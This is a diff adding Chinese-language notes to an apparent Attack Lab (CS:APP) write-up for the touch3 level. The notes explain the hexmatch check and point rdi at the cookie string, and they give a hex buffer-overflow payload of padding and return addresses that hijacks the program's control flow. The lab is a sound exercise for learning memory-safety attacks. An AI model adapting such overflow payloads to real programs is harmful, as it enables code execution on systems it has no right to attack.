@@ -101,4 +101,19 @@ touch3的源码
 22 }
 ```
 发现其调用了hexmathch函数，并将cookie和sval作为指针传入其中。
+hexmatch函数会将我们的cookie值以字符串形式输出，然后与rdi中的值进行比对，相同则通过程序。
+使用gdb进行调试的时候可以发现，只需要将rdi的值设置为与rsi中存入的cookie字符串对应的地址
+就可以完成本题
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image3.png)
+```
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+1b 14 40 00 00 00 00 00 
+23 dc 61 55 00 00 00 00 
+fa 18 40 00 00 00 00 00
+```
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image4.png)
 
